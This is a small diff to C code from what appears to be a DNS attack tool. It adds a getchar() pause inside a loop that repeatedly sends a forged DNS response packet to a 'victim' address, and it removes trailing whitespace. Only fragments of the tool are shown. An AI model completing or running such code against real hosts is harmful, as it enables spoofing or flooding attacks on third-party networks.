@@ -12,7 +12,7 @@ int main()
 
 void startAttack()
 {
-	sck = socket(AF_INET, SOCK_DGRAM, 0);	
+	sck = socket(AF_INET, SOCK_DGRAM, 0);
 	checkSocket();
 	bindPort();
 
@@ -65,6 +65,7 @@ void toAttack()
 	mountDnsPackage((unsigned char) _RESPONSE, buffer, host);
 	while (true)
 	{
+		getchar();
 		if (sendto(sck, (char*) buffer, sizeof(struct DNS_H) + (strlen(host)+1) + sizeof(struct QUESTION), 0, (struct sockaddr*)&victim, sizeAddr) < 0)
 	        printf("\nSendto local host failed!\n");
 	}
